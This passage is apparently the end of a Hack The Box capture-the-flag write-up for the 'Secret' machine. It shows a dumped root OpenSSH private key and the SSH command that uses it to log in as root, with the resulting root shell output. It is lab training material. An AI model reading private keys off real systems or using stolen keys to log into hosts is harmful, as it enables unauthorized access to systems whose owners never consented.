7wNrxitkPrmuViWPGQCotBDCZmn4WNbNT0kcsfA+b4xB+am6tyDthqjfPJngROf0Z26lA1                                                                                                                        
xw0OmoCdyhvQ3azlbkZZ7EWeTtQ/EYcdYofa8/mbQ+amOb9YaqWGiBai69w0Hzf06lB8cx                                                                                                                        
8G+KbGPcN174a666dRwDFmbrd9nc9E2YGn5aUfMkvbaJoqdHRHGCN1rI78J7rPRaTC8aTu                                                                                                                        
BKexPVVXhBO6+e1htuO31rHMTHABt4+6K4wv7YvmXz3Ax4HIScfopVl7futnEaJPfHBdg2                                                                                                                        
5yXbi8lafKAGQHLZjD9vsyEi5wqoVOYalTXEXZwOrstp3Y93VKx4kGGBqovBKMtlRaic+Y                                                                                                                        
Tv0vTW3fis9d7aMqLpuuFMEHxTQPyor3+/aEHiLLAAAFiMxy1SzMctUsAAAAB3NzaC1yc2                                                                                                                        
EAAAGBAJ+sy5Zu0DhhmcrVAjt0jaUeb3Q38Tc5X5FMOJzMP4RZaUT2ikW4tylGbASsoKDr                                                                                                                        
85oc1mHLONd1AyalDFrPqPTsHqtL4sENUCZlcM76hYxTUsc1xFaI5qAnj8Pu8Da8YrZD65                                                                                                                        
rlYljxkAqLQQwmZp+FjWzU9JHLHwPm+MQfmpurcg7Yao3zyZ4ETn9GdupQNccNDpqAncob                                                                                                                        
0N2s5W5GWexFnk7UPxGHHWKH2vP5m0Pmpjm/WGqlhogWouvcNB839OpQfHMfBvimxj3Dde                                                                                                                        
+GuuunUcAxZm63fZ3PRNmBp+WlHzJL22iaKnR0RxgjdayO/Ce6z0WkwvGk7gSnsT1VV4QT                                                                                                                        
uvntYbbjt9axzExwAbePuiuML+2L5l89wMeByEnH6KVZe37rZxGiT3xwXYNucl24vJWnyg                                                                                                                        
BkBy2Yw/b7MhIucKqFTmGpU1xF2cDq7Lad2Pd1SseJBhgaqLwSjLZUWonPmE79L01t34rP                                                                                                                        
Xe2jKi6brhTBB8U0D8qK9/v2hB4iywAAAAMBAAEAAAGAGkWVDcBX1B8C7eOURXIM6DEUx3                                                                                                                        
t43cw71C1FV08n2D/Z2TXzVDtrL4hdt3srxq5r21yJTXfhd1nSVeZsHPjz5LCA71BCE997                                                                                                                        
44VnRTblCEyhXxOSpWZLA+jed691qJvgZfrQ5iB9yQKd344/+p7K3c5ckZ6MSvyvsrWrEq                                                                                                                        
Hcj2ZrEtQ62/ZTowM0Yy6V3EGsR373eyZUT++5su+CpF1A6GYgAPpdEiY4CIEv3lqgWFC3                                                                                                                        
4uJ/yrRHaVbIIaSOkuBi0h7Is562aoGp7/9Q3j/YUjKBtLvbvbNRxwM+sCWLasbK5xS7Vv                                                                                                                        
D569yMirw2xOibp3nHepmEJnYZKomzqmFsEvA1GbWiPdLCwsX7btbcp0tbjsD5dmAcU4nF                                                                                                                        
JZI1vtYUKoNrmkI5WtvCC8bBvA4BglXPSrrj1pGP9QPVdUVyOc6QKSbfomyefO2HQqne6z                                                                                                                        
y0N8QdAZ3dDzXfBlVfuPpdP8yqUnrVnzpL8U/gc1ljKcSEx262jXKHAG3mTTNKtooZAAAA                                                                                                                        
wQDPMrdvvNWrmiF9CSfTnc5v3TQfEDFCUCmtCEpTIQHhIxpiv+mocHjaPiBRnuKRPDsf81                                                                                                                        
ainyiXYooPZqUT2lBDtIdJbid6G7oLoVbx4xDJ7h4+U70rpMb/tWRBuM51v9ZXAlVUz14o                                                                                                                        
Kt+Rx9peAx7dEfTHNvfdauGJL6k3QyGo+90nQDripDIUPvE0sac1tFLrfvJHYHsYiS7hLM                                                                                                                        
dFu1uEJvusaIbslVQqpAqgX5Ht75rd0BZytTC9Dx3b71YYSdoAAADBANMZ5ELPuRUDb0Gh                                                                                                                        
mXSlMvZVJEvlBISUVNM2YC+6hxh2Mc/0Szh0060qZv9ub3DXCDXMrwR5o6mdKv/kshpaD4                                                                                                                        
Ml+fjgTzmOo/kTaWpKWcHmSrlCiMi1YqWUM6k9OCfr7UTTd7/uqkiYfLdCJGoWkehGGxep                                                                                                                        
lJpUUj34t0PD8eMFnlfV8oomTvruqx0wWp6EmiyT9zjs2vJ3zapp2HWuaSdv7s2aF3gibc                                                                                                                        
z04JxGYCePRKTBy/kth9VFsAJ3eQezpwAAAMEAwaLVktNNw+sG/Erdgt1i9/vttCwVVhw9                                                                                                                        
RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP9                                                                                                                        
6urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7Pl                                                                                                                        
xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k                                                                                                                        
fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA==                                                                                                                                                
-----END OPENSSH PRIVATE KEY-----                                                                                                                                                             
aliases                                                                                                                                                                                       
ethers

...
```

We got the root id_rsa private key. Now, log into the host as root user via SSH private key.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation/privesc]
└──╼ [★]$ ssh -i id_rsa root@secret.htb
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 22 Jan 2022 01:59:25 AM UTC

  System load:  0.0               Processes:             214
  Usage of /:   52.7% of 8.79GB   Users logged in:       1
  Memory usage: 18%               IPv4 address for eth0: 10.10.11.120
  Swap usage:   0%

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Oct 26 15:13:55 2021
root@secret:~# id
uid=0(root) gid=0(root) groups=0(root)
```

![Untitled](images/Untitled%206.png)